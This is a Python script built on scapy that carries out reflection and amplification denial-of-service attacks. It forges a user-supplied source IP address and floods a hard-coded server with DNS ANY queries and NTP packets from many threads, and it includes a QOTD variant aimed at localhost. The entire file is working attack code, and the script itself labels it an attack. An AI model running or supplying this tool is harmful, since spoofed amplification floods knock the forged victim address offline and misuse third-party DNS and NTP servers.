from scapy.all import *
import threading
import time 
import socket

fakesrc = '192.168.1.149'
server = '128.186.6.103'
device = 'wlp58s0'
mypacketANY = IP(dst=server, src=fakesrc)/UDP(sport=64032, dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
mypacketNTP = 	packet = (IP(dst=server, src=fakesrc)/UDP(sport=53, dport=53)/NTP(version=4)/Raw(load="\x17\x00\x03\x2a" + "\x00" * 4))
payload = "\x00"
mypacketQOTD= (IP(dst="127.0.0.1", src=fakesrc)/UDP(dport=4352, sport=53)/payload)
def send_packetANY():
	while True:
		send(mypacketANY, loop=1)
def send_packetNTP():
	while True:
		send(mypacketNTP, loop=1)
def send_packetQOTD():
	while True:
		payload = "\x00"
		conf.L3socket=L3RawSocket
		mypacketQOTD= (IP(dst="127.0.0.1", src=fakesrc)/UDP(dport=4352, sport=53)/payload)
		send(mypacketQOTD, iface="lo", loop=1)


if __name__=="__main__":
	fakesrc = raw_input("Enter the fake source ip Address: ")
	typeAttack = raw_input("Enter the Type of Attack\n \t'Any'\n\t'NTP'\n\t'QOTD'\n\t:")
	mypacketANY = IP(dst=server, src=fakesrc)/UDP(sport=64032, dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
	mypacketNTP = 	packet = (IP(dst=server, src=fakesrc)/UDP(sport=53, dport=53)/NTP(version=4)/Raw(load="\x17\x00\x03\x2a" + "\x00" * 4))
	

	if typeAttack=='Any':
		for i in range(0,10):
			thread = threading.Thread(target=send_packetANY);
			thread.daemon = True;
			thread.start();
		try:
			while True:
				time.sleep(1);
		except KeyboardInterrupt:
			print("Script Stopped [ctrl + c]... Shutting down")
	

	elif typeAttack=='NTP':
		for i in range(0,20):
			thread = threading.Thread(target=send_packetNTP);
			thread.daemon = True;
			thread.start();
		try:
			while True:
				time.sleep(1);
		except KeyboardInterrupt:
			print("Script Stopped [ctrl + c]... Shutting down")
	
	

	else:
		raw_input('For a QOTD attack, were going to need to change the destiation\n\
Make sure you have turned on your own personal server: eg qotd server\n\
Hit y when you have done this:')
		for i in range(0,100):
			thread = threading.Thread(target=send_packetQOTD);
			thread.daemon = True;
			thread.start();
		try:
			while True:
				time.sleep(1);
		except KeyboardInterrupt:
			print("Script Stopped [ctrl + c]... Shutting down")
	
	
	# Script ends here
